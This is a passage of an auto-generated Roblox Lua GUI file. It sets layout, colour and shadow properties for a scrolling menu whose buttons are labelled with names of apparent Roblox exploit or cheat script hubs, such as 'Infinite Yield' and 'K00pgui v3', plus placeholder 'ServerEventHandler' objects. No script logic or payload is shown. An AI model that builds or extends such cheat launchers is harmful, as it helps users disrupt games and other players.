--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit
G2L["5"].Name = [[ScrollingCoolThingDonotEditit]]
G2L["5"].BottomImage = [[rbxasset://textures/ui/Scroll/scroll-bottom.png]]
G2L["5"].CanvasSize = UDim2.new(0, 0, 2, 0)
G2L["5"].HorizontalScrollBarInset = Enum.ScrollBarInset.None
G2L["5"].ScrollBarThickness = 12
G2L["5"].TopImage = [[rbxasset://textures/ui/Scroll/scroll-top.png]]
G2L["5"].Active = true
G2L["5"].AnchorPoint = Vector2.new(0, 0)
G2L["5"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["5"].BackgroundTransparency = 1
G2L["5"].BorderColor3 = Color3.fromRGB(100, 100, 100)
G2L["5"].BorderSizePixel = 0
G2L["5"].ClipsDescendants = true
G2L["5"].Draggable = false
G2L["5"].Position = UDim2.new(4.7833193E-08, 0, 0.13957432, 0)
G2L["5"].Rotation = 0
G2L["5"].Selectable = true
G2L["5"].SelectionOrder = 0
G2L["5"].Size = UDim2.new(0, 639, 0, 559)
G2L["5"].Visible = true
G2L["5"].ZIndex = 1
G2L["5"].Parent = G2L["2"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton
G2L["6"].Name = [[TextButton]]
G2L["6"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["6"].Text = [[Infinite Yield 2D]]
G2L["6"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["6"].TextScaled = true
G2L["6"].TextSize = 14
G2L["6"].TextStrokeColor3 = Color3.fromRGB(255, 240.00002, 240.00002)
G2L["6"].TextStrokeTransparency = 1
G2L["6"].TextWrapped = true
G2L["6"].TextXAlignment = Enum.TextXAlignment.Center
G2L["6"].TextYAlignment = Enum.TextYAlignment.Center
G2L["6"].Active = true
G2L["6"].AnchorPoint = Vector2.new(0, 0)
G2L["6"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["6"].BackgroundTransparency = 0.5
G2L["6"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["6"].BorderSizePixel = 1
G2L["6"].ClipsDescendants = false
G2L["6"].Draggable = false
G2L["6"].Position = UDim2.new(0, 0, 0, 0)
G2L["6"].Rotation = 0
G2L["6"].Selectable = true
G2L["6"].SelectionOrder = 0
G2L["6"].Size = UDim2.new(0, 100, 0, 67)
G2L["6"].Visible = true
G2L["6"].ZIndex = 1
G2L["6"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.UICorner
G2L["7"].Name = [[UICorner]]
G2L["7"].CornerRadius = UDim.new(0, 8)
G2L["7"].Parent = G2L["6"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.Script
G2L["8"].Name = [[Script]]
G2L["8"].Parent = G2L["6"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.TextButton_Roundify_12px
G2L["9"].Name = [[TextButton_Roundify_12px]]
G2L["9"].Image = [[rbxassetid://3570695787]]
G2L["9"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["9"].ScaleType = Enum.ScaleType.Slice
G2L["9"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["9"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["9"].Active = true
G2L["9"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["9"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["9"].BackgroundTransparency = 1
G2L["9"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["9"].BorderSizePixel = 1
G2L["9"].ClipsDescendants = false
G2L["9"].Draggable = false
G2L["9"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["9"].Rotation = 0
G2L["9"].Selectable = true
G2L["9"].SelectionOrder = 0
G2L["9"].Size = UDim2.new(1, 0, 1, 0)
G2L["9"].Visible = true
G2L["9"].ZIndex = 1
G2L["9"].Parent = G2L["6"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder
G2L["10"].Name = [[shadowHolder]]
G2L["10"].Active = false
G2L["10"].AnchorPoint = Vector2.new(0, 0)
G2L["10"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["10"].BackgroundTransparency = 1
G2L["10"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["10"].BorderSizePixel = 1
G2L["10"].ClipsDescendants = false
G2L["10"].Draggable = false
G2L["10"].Position = UDim2.new(0, 0, 0, 0)
G2L["10"].Rotation = 0
G2L["10"].Selectable = false
G2L["10"].SelectionOrder = 0
G2L["10"].Size = UDim2.new(1, 0, 1, 0)
G2L["10"].Visible = true
G2L["10"].ZIndex = -1
G2L["10"].Parent = G2L["6"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.umbraShadow
G2L["11"].Name = [[umbraShadow]]
G2L["11"].Image = [[rbxassetid://1316045217]]
G2L["11"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["11"].ScaleType = Enum.ScaleType.Slice
G2L["11"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["11"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["11"].Active = false
G2L["11"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["11"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["11"].BackgroundTransparency = 1
G2L["11"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["11"].BorderSizePixel = 1
G2L["11"].ClipsDescendants = false
G2L["11"].Draggable = false
G2L["11"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["11"].Rotation = 0
G2L["11"].Selectable = false
G2L["11"].SelectionOrder = 0
G2L["11"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["11"].Visible = true
G2L["11"].ZIndex = 1
G2L["11"].Parent = G2L["10"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.penumbraShadow
G2L["12"].Name = [[penumbraShadow]]
G2L["12"].Image = [[rbxassetid://1316045217]]
G2L["12"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["12"].ScaleType = Enum.ScaleType.Slice
G2L["12"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["12"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["12"].Active = false
G2L["12"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["12"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["12"].BackgroundTransparency = 1
G2L["12"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["12"].BorderSizePixel = 1
G2L["12"].ClipsDescendants = false
G2L["12"].Draggable = false
G2L["12"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["12"].Rotation = 0
G2L["12"].Selectable = false
G2L["12"].SelectionOrder = 0
G2L["12"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["12"].Visible = true
G2L["12"].ZIndex = 1
G2L["12"].Parent = G2L["10"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.TextButton.shadowHolder.ambientShadow
G2L["13"].Name = [[ambientShadow]]
G2L["13"].Image = [[rbxassetid://1316045217]]
G2L["13"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["13"].ScaleType = Enum.ScaleType.Slice
G2L["13"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["13"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["13"].Active = false
G2L["13"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["13"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["13"].BackgroundTransparency = 1
G2L["13"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["13"].BorderSizePixel = 1
G2L["13"].ClipsDescendants = false
G2L["13"].Draggable = false
G2L["13"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["13"].Rotation = 0
G2L["13"].Selectable = false
G2L["13"].SelectionOrder = 0
G2L["13"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["13"].Visible = true
G2L["13"].ZIndex = 1
G2L["13"].Parent = G2L["10"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode
G2L["14"].Name = [[Bytecode]]
G2L["14"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["14"].Text = [[Infinite Yield Bytecode]]
G2L["14"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["14"].TextScaled = true
G2L["14"].TextSize = 14
G2L["14"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["14"].TextStrokeTransparency = 1
G2L["14"].TextWrapped = true
G2L["14"].TextXAlignment = Enum.TextXAlignment.Center
G2L["14"].TextYAlignment = Enum.TextYAlignment.Center
G2L["14"].Active = true
G2L["14"].AnchorPoint = Vector2.new(0, 0)
G2L["14"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["14"].BackgroundTransparency = 0.5
G2L["14"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["14"].BorderSizePixel = 0
G2L["14"].ClipsDescendants = false
G2L["14"].Draggable = false
G2L["14"].Position = UDim2.new(0, 0, 0, 0)
G2L["14"].Rotation = 0
G2L["14"].Selectable = true
G2L["14"].SelectionOrder = 0
G2L["14"].Size = UDim2.new(0, 200, 0, 50)
G2L["14"].Visible = true
G2L["14"].ZIndex = 1
G2L["14"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.TextButton_Roundify_12px
G2L["15"].Name = [[TextButton_Roundify_12px]]
G2L["15"].Image = [[rbxassetid://3570695787]]
G2L["15"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["15"].ScaleType = Enum.ScaleType.Slice
G2L["15"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["15"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["15"].Active = true
G2L["15"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["15"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["15"].BackgroundTransparency = 1
G2L["15"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["15"].BorderSizePixel = 1
G2L["15"].ClipsDescendants = false
G2L["15"].Draggable = false
G2L["15"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["15"].Rotation = 0
G2L["15"].Selectable = true
G2L["15"].SelectionOrder = 0
G2L["15"].Size = UDim2.new(1, 0, 1, 0)
G2L["15"].Visible = true
G2L["15"].ZIndex = 1
G2L["15"].Parent = G2L["14"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.RippleClick
G2L["16"].Name = [[RippleClick]]
G2L["16"].Parent = G2L["14"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.RippleClick.Circle
G2L["17"].Name = [[Circle]]
G2L["17"].Image = [[rbxassetid://266543268]]
G2L["17"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["17"].ScaleType = Enum.ScaleType.Stretch
G2L["17"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["17"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["17"].Active = false
G2L["17"].AnchorPoint = Vector2.new(0, 0)
G2L["17"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["17"].BackgroundTransparency = 1
G2L["17"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["17"].BorderSizePixel = 1
G2L["17"].ClipsDescendants = false
G2L["17"].Draggable = false
G2L["17"].Position = UDim2.new(0, 0, 0, 0)
G2L["17"].Rotation = 0
G2L["17"].Selectable = false
G2L["17"].SelectionOrder = 0
G2L["17"].Size = UDim2.new(0, 0, 0, 0)
G2L["17"].Visible = true
G2L["17"].ZIndex = 10
G2L["17"].Parent = G2L["16"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.UICorner
G2L["18"].Name = [[UICorner]]
G2L["18"].CornerRadius = UDim.new(0, 10)
G2L["18"].Parent = G2L["14"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.ServerEventHandler
G2L["19"].Name = [[ServerEventHandler]]
G2L["19"].Parent = G2L["14"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder
G2L["20"].Name = [[shadowHolder]]
G2L["20"].Active = false
G2L["20"].AnchorPoint = Vector2.new(0, 0)
G2L["20"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["20"].BackgroundTransparency = 1
G2L["20"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["20"].BorderSizePixel = 1
G2L["20"].ClipsDescendants = false
G2L["20"].Draggable = false
G2L["20"].Position = UDim2.new(0, 0, 0, 0)
G2L["20"].Rotation = 0
G2L["20"].Selectable = false
G2L["20"].SelectionOrder = 0
G2L["20"].Size = UDim2.new(1, 0, 1, 0)
G2L["20"].Visible = true
G2L["20"].ZIndex = -1
G2L["20"].Parent = G2L["14"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.umbraShadow
G2L["21"].Name = [[umbraShadow]]
G2L["21"].Image = [[rbxassetid://1316045217]]
G2L["21"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["21"].ScaleType = Enum.ScaleType.Slice
G2L["21"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["21"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["21"].Active = false
G2L["21"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["21"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["21"].BackgroundTransparency = 1
G2L["21"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["21"].BorderSizePixel = 1
G2L["21"].ClipsDescendants = false
G2L["21"].Draggable = false
G2L["21"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["21"].Rotation = 0
G2L["21"].Selectable = false
G2L["21"].SelectionOrder = 0
G2L["21"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["21"].Visible = true
G2L["21"].ZIndex = 1
G2L["21"].Parent = G2L["20"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.penumbraShadow
G2L["22"].Name = [[penumbraShadow]]
G2L["22"].Image = [[rbxassetid://1316045217]]
G2L["22"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["22"].ScaleType = Enum.ScaleType.Slice
G2L["22"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["22"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["22"].Active = false
G2L["22"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["22"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["22"].BackgroundTransparency = 1
G2L["22"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["22"].BorderSizePixel = 1
G2L["22"].ClipsDescendants = false
G2L["22"].Draggable = false
G2L["22"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["22"].Rotation = 0
G2L["22"].Selectable = false
G2L["22"].SelectionOrder = 0
G2L["22"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["22"].Visible = true
G2L["22"].ZIndex = 1
G2L["22"].Parent = G2L["20"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Bytecode.shadowHolder.ambientShadow
G2L["23"].Name = [[ambientShadow]]
G2L["23"].Image = [[rbxassetid://1316045217]]
G2L["23"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["23"].ScaleType = Enum.ScaleType.Slice
G2L["23"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["23"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["23"].Active = false
G2L["23"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["23"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["23"].BackgroundTransparency = 1
G2L["23"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["23"].BorderSizePixel = 1
G2L["23"].ClipsDescendants = false
G2L["23"].Draggable = false
G2L["23"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["23"].Rotation = 0
G2L["23"].Selectable = false
G2L["23"].SelectionOrder = 0
G2L["23"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["23"].Visible = true
G2L["23"].ZIndex = 1
G2L["23"].Parent = G2L["20"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x
G2L["24"].Name = [[Chin x]]
G2L["24"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["24"].Text = [[Chin x]]
G2L["24"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["24"].TextScaled = true
G2L["24"].TextSize = 14
G2L["24"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["24"].TextStrokeTransparency = 1
G2L["24"].TextWrapped = true
G2L["24"].TextXAlignment = Enum.TextXAlignment.Center
G2L["24"].TextYAlignment = Enum.TextYAlignment.Center
G2L["24"].Active = true
G2L["24"].AnchorPoint = Vector2.new(0, 0)
G2L["24"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["24"].BackgroundTransparency = 0.5
G2L["24"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["24"].BorderSizePixel = 0
G2L["24"].ClipsDescendants = false
G2L["24"].Draggable = false
G2L["24"].Position = UDim2.new(0, 0, 0, 0)
G2L["24"].Rotation = 0
G2L["24"].Selectable = true
G2L["24"].SelectionOrder = 0
G2L["24"].Size = UDim2.new(0, 200, 0, 50)
G2L["24"].Visible = true
G2L["24"].ZIndex = 1
G2L["24"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.TextButton_Roundify_12px
G2L["25"].Name = [[TextButton_Roundify_12px]]
G2L["25"].Image = [[rbxassetid://3570695787]]
G2L["25"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["25"].ScaleType = Enum.ScaleType.Slice
G2L["25"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["25"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["25"].Active = true
G2L["25"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["25"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["25"].BackgroundTransparency = 1
G2L["25"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["25"].BorderSizePixel = 1
G2L["25"].ClipsDescendants = false
G2L["25"].Draggable = false
G2L["25"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["25"].Rotation = 0
G2L["25"].Selectable = true
G2L["25"].SelectionOrder = 0
G2L["25"].Size = UDim2.new(1, 0, 1, 0)
G2L["25"].Visible = true
G2L["25"].ZIndex = 1
G2L["25"].Parent = G2L["24"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.RippleClick
G2L["26"].Name = [[RippleClick]]
G2L["26"].Parent = G2L["24"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.RippleClick.Circle
G2L["27"].Name = [[Circle]]
G2L["27"].Image = [[rbxassetid://266543268]]
G2L["27"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["27"].ScaleType = Enum.ScaleType.Stretch
G2L["27"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["27"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["27"].Active = false
G2L["27"].AnchorPoint = Vector2.new(0, 0)
G2L["27"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["27"].BackgroundTransparency = 1
G2L["27"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["27"].BorderSizePixel = 1
G2L["27"].ClipsDescendants = false
G2L["27"].Draggable = false
G2L["27"].Position = UDim2.new(0, 0, 0, 0)
G2L["27"].Rotation = 0
G2L["27"].Selectable = false
G2L["27"].SelectionOrder = 0
G2L["27"].Size = UDim2.new(0, 0, 0, 0)
G2L["27"].Visible = true
G2L["27"].ZIndex = 10
G2L["27"].Parent = G2L["26"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.UICorner
G2L["28"].Name = [[UICorner]]
G2L["28"].CornerRadius = UDim.new(0, 10)
G2L["28"].Parent = G2L["24"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.ServerEventHandler
G2L["29"].Name = [[ServerEventHandler]]
G2L["29"].Parent = G2L["24"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder
G2L["30"].Name = [[shadowHolder]]
G2L["30"].Active = false
G2L["30"].AnchorPoint = Vector2.new(0, 0)
G2L["30"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["30"].BackgroundTransparency = 1
G2L["30"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["30"].BorderSizePixel = 1
G2L["30"].ClipsDescendants = false
G2L["30"].Draggable = false
G2L["30"].Position = UDim2.new(0, 0, 0, 0)
G2L["30"].Rotation = 0
G2L["30"].Selectable = false
G2L["30"].SelectionOrder = 0
G2L["30"].Size = UDim2.new(1, 0, 1, 0)
G2L["30"].Visible = true
G2L["30"].ZIndex = -1
G2L["30"].Parent = G2L["24"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.umbraShadow
G2L["31"].Name = [[umbraShadow]]
G2L["31"].Image = [[rbxassetid://1316045217]]
G2L["31"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["31"].ScaleType = Enum.ScaleType.Slice
G2L["31"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["31"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["31"].Active = false
G2L["31"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["31"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["31"].BackgroundTransparency = 1
G2L["31"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["31"].BorderSizePixel = 1
G2L["31"].ClipsDescendants = false
G2L["31"].Draggable = false
G2L["31"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["31"].Rotation = 0
G2L["31"].Selectable = false
G2L["31"].SelectionOrder = 0
G2L["31"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["31"].Visible = true
G2L["31"].ZIndex = 1
G2L["31"].Parent = G2L["30"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.penumbraShadow
G2L["32"].Name = [[penumbraShadow]]
G2L["32"].Image = [[rbxassetid://1316045217]]
G2L["32"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["32"].ScaleType = Enum.ScaleType.Slice
G2L["32"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["32"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["32"].Active = false
G2L["32"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["32"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["32"].BackgroundTransparency = 1
G2L["32"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["32"].BorderSizePixel = 1
G2L["32"].ClipsDescendants = false
G2L["32"].Draggable = false
G2L["32"].Position = UDim2.new(0.5, 0, 0.48366833, 8)
G2L["32"].Rotation = 0
G2L["32"].Selectable = false
G2L["32"].SelectionOrder = 0
G2L["32"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["32"].Visible = true
G2L["32"].ZIndex = 1
G2L["32"].Parent = G2L["30"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.Chin x.shadowHolder.ambientShadow
G2L["33"].Name = [[ambientShadow]]
G2L["33"].Image = [[rbxassetid://1316045217]]
G2L["33"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["33"].ScaleType = Enum.ScaleType.Slice
G2L["33"].SliceCenter = Rect.new(10, 10, 118, 118)
G2L["33"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["33"].Active = false
G2L["33"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["33"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["33"].BackgroundTransparency = 1
G2L["33"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["33"].BorderSizePixel = 1
G2L["33"].ClipsDescendants = false
G2L["33"].Draggable = false
G2L["33"].Position = UDim2.new(0.5157791, 0, 0.48366833, 8)
G2L["33"].Rotation = 0
G2L["33"].Selectable = false
G2L["33"].SelectionOrder = 0
G2L["33"].Size = UDim2.new(0.9802761, 10, 0.96733665, 10)
G2L["33"].Visible = true
G2L["33"].ZIndex = 1
G2L["33"].Parent = G2L["30"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3
G2L["34"].Name = [[k00p v3]]
G2L["34"].FontFace = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G2L["34"].Text = [[K00pgui v3]]
G2L["34"].TextColor3 = Color3.fromRGB(255, 255, 255)
G2L["34"].TextScaled = true
G2L["34"].TextSize = 14
G2L["34"].TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
G2L["34"].TextStrokeTransparency = 1
G2L["34"].TextWrapped = true
G2L["34"].TextXAlignment = Enum.TextXAlignment.Center
G2L["34"].TextYAlignment = Enum.TextYAlignment.Center
G2L["34"].Active = true
G2L["34"].AnchorPoint = Vector2.new(0, 0)
G2L["34"].BackgroundColor3 = Color3.fromRGB(200.00002, 0, 255)
G2L["34"].BackgroundTransparency = 0.5
G2L["34"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["34"].BorderSizePixel = 0
G2L["34"].ClipsDescendants = false
G2L["34"].Draggable = false
G2L["34"].Position = UDim2.new(0, 0, 0, 0)
G2L["34"].Rotation = 0
G2L["34"].Selectable = true
G2L["34"].SelectionOrder = 0
G2L["34"].Size = UDim2.new(0, 200, 0, 50)
G2L["34"].Visible = true
G2L["34"].ZIndex = 1
G2L["34"].Parent = G2L["5"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.TextButton_Roundify_12px
G2L["35"].Name = [[TextButton_Roundify_12px]]
G2L["35"].Image = [[rbxassetid://3570695787]]
G2L["35"].ImageColor3 = Color3.fromRGB(255, 0, 0)
G2L["35"].ScaleType = Enum.ScaleType.Slice
G2L["35"].SliceCenter = Rect.new(100, 100, 100, 100)
G2L["35"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["35"].Active = true
G2L["35"].AnchorPoint = Vector2.new(0.5, 0.5)
G2L["35"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["35"].BackgroundTransparency = 1
G2L["35"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["35"].BorderSizePixel = 1
G2L["35"].ClipsDescendants = false
G2L["35"].Draggable = false
G2L["35"].Position = UDim2.new(0.5, 0, 0.5, 0)
G2L["35"].Rotation = 0
G2L["35"].Selectable = true
G2L["35"].SelectionOrder = 0
G2L["35"].Size = UDim2.new(1, 0, 1, 0)
G2L["35"].Visible = true
G2L["35"].ZIndex = 1
G2L["35"].Parent = G2L["34"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.RippleClick
G2L["36"].Name = [[RippleClick]]
G2L["36"].Parent = G2L["34"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.RippleClick.Circle
G2L["37"].Name = [[Circle]]
G2L["37"].Image = [[rbxassetid://266543268]]
G2L["37"].ImageColor3 = Color3.fromRGB(0, 0, 0)
G2L["37"].ScaleType = Enum.ScaleType.Stretch
G2L["37"].SliceCenter = Rect.new(0, 0, 0, 0)
G2L["37"].TileSize = UDim2.new(1, 0, 1, 0)
G2L["37"].Active = false
G2L["37"].AnchorPoint = Vector2.new(0, 0)
G2L["37"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
G2L["37"].BackgroundTransparency = 1
G2L["37"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
G2L["37"].BorderSizePixel = 1
G2L["37"].ClipsDescendants = false
G2L["37"].Draggable = false
G2L["37"].Position = UDim2.new(0, 0, 0, 0)
G2L["37"].Rotation = 0
G2L["37"].Selectable = false
G2L["37"].SelectionOrder = 0
G2L["37"].Size = UDim2.new(0, 0, 0, 0)
G2L["37"].Visible = true
G2L["37"].ZIndex = 10
G2L["37"].Parent = G2L["36"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.UICorner
G2L["38"].Name = [[UICorner]]
G2L["38"].CornerRadius = UDim.new(0, 10)
G2L["38"].Parent = G2L["34"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.ServerEventHandler
G2L["39"].Name = [[ServerEventHandler]]
G2L["39"].Parent = G2L["34"]

--verified.Frame.ImageLabel.ScrollingCoolThingDonotEditit.k00p v3.shadowHolder
G2L["40"].Name = [[shadowHolder]]
G2L["40"].Active = false
G2L["40"].AnchorPoint = Vector2.new(0, 0)
G2L["40"].BackgroundColor3 = Color3.fromRGB(163, 162, 165)
G2L["40"].BackgroundTransparency = 1
G2L["40"].BorderColor3 = Color3.fromRGB(27.000002, 42, 53.000004)
